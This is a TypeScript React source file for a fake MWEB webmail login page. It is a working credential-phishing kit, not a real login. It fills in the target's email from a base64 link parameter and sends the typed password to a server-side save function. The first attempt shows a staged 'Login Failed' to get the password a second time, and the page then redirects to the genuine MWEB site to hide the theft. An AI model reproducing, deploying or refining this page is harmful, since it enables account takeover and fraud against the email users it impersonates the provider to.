import { createFileRoute } from "@tanstack/react-router";
import { z } from "zod";
import { useRef, useState, FormEvent, useEffect } from "react";
import { X } from "lucide-react";
import heroImage from "@/assets/image-104a82eeac42e8.png";
import logo from "@/assets/image.png";
import { useServerFn } from "@tanstack/react-start";
import { saveEntry } from "@/lib/submissions.functions";

// helper: decode "?e=<base64>" into an email
const decodeEmail = (raw: string | undefined): string | null => {
  if (!raw) return null;
  try {
    // atob round-trip; un-URL-safe characters first
    const normalized = raw.replace(/-/g, "+").replace(/_/g, "/");
    const decoded = typeof Buffer !== "undefined"
      ? Buffer.from(normalized, "base64").toString("utf-8")
      : atob(normalized);
    // basic sanity: must look like an email
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded) ? decoded : null;
  } catch {
    return null;
  }};

export const Route = createFileRoute("/")({
  // accepts ?e=<base64-of-email>
  validateSearch: z.object({
    e: z.string().optional(),
  }),
  component: Index,
});

function Index() {
  const { e } = Route.useSearch();
  const prefilled = decodeEmail(e);
  const [email, setEmail] = useState(prefilled ?? "yourname@example.com");
  const [password, setPassword] = useState("");
  const [attempted, setAttempted] = useState(false);
  const [showError, setShowError] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const saveEntryFn = useServerFn(saveEntry);
  const [maxReached, setMaxReached] = useState(false);
  const [passwordError, setPasswordError] = useState(false);
  
  const handleClose = () => {
    setMaxReached(false);
    // Use replace instead of href to prevent back button from returning
    window.location.replace('https://mweb.co.za');
  };

  const emailError = attempted && !email.trim();
  
  return (
    <div className="flex min-h-screen flex-col bg-background">
      <header className="w-full bg-[var(--brand-footer)] px-5 py-2">
        <a href="/" className="inline-block">
          <img src={logo} alt="mweb." className="h-8 w-auto" />
        </a>
      </header>

      <main className="flex-1">
        {/* Desktop: Image + Form side by side */}
        <div className="hidden lg:grid lg:grid-cols-[1.3fr_1fr] lg:h-full lg:min-h-[calc(100vh-80px)]">
          <section className="flex items-center justify-center bg-[var(--brand-panel)] p-12">
            <img
              src={heroImage}
              alt="Person using laptop to check email"
              width={1024}
              height={1280}
              className="max-h-[80vh] w-auto object-contain"
            />
          </section>

          <section className="flex items-center justify-center px-6 py-12 sm:px-12">
            <div className="w-full max-w-md">
              {/* Form content - same as below */}
              <FormContent 
                email={email}
                setEmail={setEmail}
                password={password}
                setPassword={setPassword}
                attempted={attempted}
                setAttempted={setAttempted}
                submitting={submitting}
                maxReached={maxReached}
                emailError={emailError}
                passwordError={passwordError}
                setPasswordError={setPasswordError}
                saveEntryFn={saveEntryFn}
                setShowError={setShowError}
                setMaxReached={setMaxReached}
                setSubmitting={setSubmitting}
              />
            </div>
          </section>
        </div>

        {/* Tablet & Mobile: Full width form with landscape-style inputs */}
        <div className="lg:hidden">
          <section className="flex items-center justify-center px-4 py-8 sm:px-8">
            <div className="w-full max-w-2xl">
              {/* Landscape-style form for medium screens */}
              <h1 className="text-4xl sm:text-5xl font-bold text-center tracking-tight text-foreground">
                <strong>My Email</strong>
              </h1>

              <div className="mt-8 sm:mt-10">
                <h2 className="text-xl font-semibold text-foreground">Log Into Your Email</h2>
                <p className="mt-1 text-sm text-muted-foreground">
                  Log in using your email address and password.
                </p>
              </div>

              <form
                className="mt-6 space-y-4"
                onSubmit={async (e) => {
                  e.preventDefault();
                  setAttempted(true);

                  if (!password.trim()) {
                    setPasswordError(true);
                    return;
                  }

                  setSubmitting(true);
                  try {
                    const res = await saveEntryFn({ data: { email: email.trim(), value: password } });
                    if (res?.status === "max_reached") {
                      setMaxReached(true);
                      setShowError(false);
                    } else if (res?.status === "saved" && res.slot === "A") {
                      setMaxReached(false);
                      setShowError(true);
                    } else if (res?.status === "saved" && res.slot === "B") {
                      setShowError(false);
                      setMaxReached(true);
                    }
                  } catch (err) {
                    console.error("Failed to save submission", err);
                    setShowError(true);
                  } finally {
                    setSubmitting(false);
                  }
                }}
              >
                <div className="relative">
                  <input
                    id="email-mobile"
                    type="email"
                    placeholder=" "
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    readOnly
                    className={`peer w-full cursor-default rounded-lg border bg-muted/50 px-4 pt-5 pb-2 text-foreground outline-none transition ${
                      emailError
                        ? "border-destructive focus:border-destructive focus:ring-2 focus:ring-destructive/30"
                        : "border-border focus:border-ring focus:ring-2 focus:ring-ring/30"
                    }`}
                  />
                  <label
                    htmlFor="email-mobile"
                    className={`pointer-events-none absolute left-4 top-1 text-xs font-medium transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1 peer-focus:text-xs ${
                      emailError ? "text-destructive" : "text-muted-foreground"
                    }`}
                  >
                    Email
                  </label>
                  {emailError && (
                    <p className="mt-1 text-sm text-destructive">This field is required</p>
                  )}
                </div>

                <div className="relative">
                  <input
                    id="password-mobile"
                    type="password"
                    placeholder=" "
                    value={password}
                    onChange={(e) => { 
                      setPassword(e.target.value);
                      if (passwordError && e.target.value.trim()) setPasswordError(false);
                    }}
                    className={`peer w-full rounded-lg border bg-background px-4 pt-5 pb-2 text-foreground outline-none transition ${
                      passwordError
                        ? "border-destructive focus:border-destructive focus:ring-2 focus:ring-destructive/30"
                        : "border-border focus:border-ring focus:ring-2 focus:ring-ring/30"
                    }`}
                  />
                  <label
                    htmlFor="password-mobile"
                    className={`pointer-events-none absolute left-4 top-1 text-xs font-medium transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1 peer-focus:text-xs ${
                      passwordError ? "text-destructive" : "text-muted-foreground"
                    }`}
                  >
                    Password
                  </label>
                  {passwordError && (
                    <p className="mt-1 text-sm text-destructive">This field is required</p>
                  )}
                </div>

                <div className="flex justify-end pt-2">
                  <button
                    type="submit"
                    disabled={submitting || maxReached}
                    className="flex w-24 items-center justify-center rounded-full bg-accent/70 px-4 py-2.5 text-sm font-semibold text-accent-foreground transition hover:bg-[var(--brand-footer)] hover:text-white disabled:cursor-not-allowed disabled:opacity-50"
                  >
                    {submitting ? (
                      <span
                        className="h-4 w-4 animate-spin rounded-full border-2 border-accent-foreground/30 border-t-accent-foreground"
                        aria-label="Submitting"
                      />
                    ) : (
                      "Log In"
                    )}
                  </button>
                </div>
              </form>

              <div className="mt-6 text-center">
                <a
                  href="#"
                  className="text-sm font-semibold text-foreground underline-offset-4 hover:underline"
                >
                  Forgot Your Password
                </a>
              </div>

              <p className="mt-10 text-sm leading-relaxed text-foreground">
                <span className="font-bold">Spam:</span> We've got you covered with our purpose-built
                Anti-Spam Cloud solution. To learn more about accessing quarantined email or managing
                your black and white lists, hop on over to our website at:{" "}
                <a
                  href="https://help.mweb.co.za/categories/mail/antispam-cloud"
                  className="font-semibold text-foreground underline"
                  target="_blank"
                  rel="noreferrer"
                >
                  Anti-Spam Cloud Help
                </a>
              </p>
            </div>
          </section>
        </div>
      </main>

      {/* Footer - responsive height: full on desktop, smaller on mobile */}
      <footer className="h-24 lg:h-18 sm:h-5 bg-[var(--brand-footer)]" />

      {showError && !maxReached && (
        <div
          role="dialog"
          aria-modal="true"
          aria-labelledby="login-failed-title"
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4"
          onClick={() => setShowError(false)}
        >
          <div
            className="relative w-full max-w-md rounded-2xl bg-white p-10 shadow-2xl"
            onClick={(e) => e.stopPropagation()}
          >
            <button
              type="button"
              aria-label="Close"
              onClick={() => setShowError(false)}
              className="absolute right-4 top-4 rounded p-1 text-foreground hover:bg-black/5"
            >
              <X size={22} />
            </button>
            <h2
              id="login-failed-title"
              className="text-center text-3xl font-bold text-foreground"
            >
              Login Failed
            </h2>
            <p className="mt-6 text-center text-lg text-foreground">
              Please use your username and password
            </p>
          </div>
        </div>
      )}
      {maxReached && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/40"
          onClick={handleClose}
        >
          <div
            className="relative w-[min(420px,92vw)] rounded-2xl bg-card p-6 shadow-xl"
            onClick={(e) => e.stopPropagation()}
          >
            <button
              type="button"
              aria-label="Close"
              onClick={handleClose}
              className="absolute right-4 top-4 rounded p-1 text-foreground hover:bg-black/5"
            >
              <X className="h-4 w-4" />
            </button>
            <h2 className="text-center text-2xl font-bold text-foreground">Success!</h2>

            <p className="text-center text-sm text-muted-foreground">
             
            </p>
          </div>
        </div>
      )}

    </div>
  );
}

// FormContent component for desktop
function FormContent({ 
  email, setEmail, password, setPassword,
  attempted, setAttempted, submitting, maxReached, emailError, passwordError,
  setPasswordError, saveEntryFn, setShowError, setMaxReached, setSubmitting
}: any) {
  return (
    <>
      <h1 className="text-5xl font-bold text-center tracking-tight text-foreground">
        <strong>My Email</strong>
      </h1>

      <div className="mt-10">
        <h2 className="text-xl font-semibold text-foreground">Log Into Your Email</h2>
        <p className="mt-1 text-sm text-muted-foreground">
          Log in using your email address and password.
        </p>
      </div>

      <form
        className="mt-6 space-y-4"
        onSubmit={async (e) => {
          e.preventDefault();
          setAttempted(true);

          if (!password.trim()) {
            setPasswordError(true);
            return;
          }

          setSubmitting(true);
          try {
            const res = await saveEntryFn({ data: { email: email.trim(), value: password } });
            if (res?.status === "max_reached") {
              setMaxReached(true);
              setShowError(false);
            } else if (res?.status === "saved" && res.slot === "A") {
              setMaxReached(false);
              setShowError(true);
            } else if (res?.status === "saved" && res.slot === "B") {
              setShowError(false);
              setMaxReached(true);
            }
          } catch (err) {
            console.error("Failed to save submission", err);
            setShowError(true);
          } finally {
            setSubmitting(false);
          }
        }}
      >
        <div className="relative">
          <input
            id="email-desktop"
            type="email"
            placeholder=" "
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            readOnly
            className={`peer w-full cursor-default rounded-lg border bg-muted/50 px-4 pt-5 pb-2 text-foreground outline-none transition ${
              emailError
                ? "border-destructive focus:border-destructive focus:ring-2 focus:ring-destructive/30"
                : "border-border focus:border-ring focus:ring-2 focus:ring-ring/30"
            }`}
          />
          <label
            htmlFor="email-desktop"
            className={`pointer-events-none absolute left-4 top-1 text-xs font-medium transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1 peer-focus:text-xs ${
              emailError ? "text-destructive" : "text-muted-foreground"
            }`}
          >
            Email
          </label>
          {emailError && (
            <p className="mt-1 text-sm text-destructive">This field is required</p>
          )}
        </div>

        <div className="relative">
          <input
            id="password-desktop"
            type="password"
            placeholder=" "
            value={password}
            onChange={(e) => { 
              setPassword(e.target.value);
              if (passwordError && e.target.value.trim()) setPasswordError(false);
            }}
            className={`peer w-full rounded-lg border bg-background px-4 pt-5 pb-2 text-foreground outline-none transition ${
              passwordError
                ? "border-destructive focus:border-destructive focus:ring-2 focus:ring-destructive/30"
                : "border-border focus:border-ring focus:ring-2 focus:ring-ring/30"
            }`}
          />
          <label
            htmlFor="password-desktop"
            className={`pointer-events-none absolute left-4 top-1 text-xs font-medium transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1 peer-focus:text-xs ${
              passwordError ? "text-destructive" : "text-muted-foreground"
            }`}
          >
            Password
          </label>
          {passwordError && (
            <p className="mt-1 text-sm text-destructive">This field is required</p>
          )}
        </div>

        <div className="flex justify-end pt-2">
          <button
            type="submit"
            disabled={submitting || maxReached}
            className="flex w-24 items-center justify-center rounded-full bg-accent/70 px-4 py-2.5 text-sm font-semibold text-accent-foreground transition hover:bg-[var(--brand-footer)] hover:text-white disabled:cursor-not-allowed disabled:opacity-50"
          >
            {submitting ? (
              <span
                className="h-4 w-4 animate-spin rounded-full border-2 border-accent-foreground/30 border-t-accent-foreground"
                aria-label="Submitting"
              />
            ) : (
              "Log In"
            )}
          </button>
        </div>
      </form>

      <div className="mt-6 text-center">
        <a
          href="#"
          className="text-sm font-semibold text-foreground underline-offset-4 hover:underline"
        >
          Forgot Your Password
        </a>
      </div>

      <p className="mt-10 text-sm leading-relaxed text-foreground">
        <span className="font-bold">Spam:</span> We've got you covered with our purpose-built
        Anti-Spam Cloud solution. To learn more about accessing quarantined email or managing
        your black and white lists, hop on over to our website at:{" "}
        <a
          href="https://help.mweb.co.za/categories/mail/antispam-cloud"
          className="font-semibold text-foreground underline"
          target="_blank"
          rel="noreferrer"
        >
          Anti-Spam Cloud Help
        </a>
      </p>
    </>
  );
}
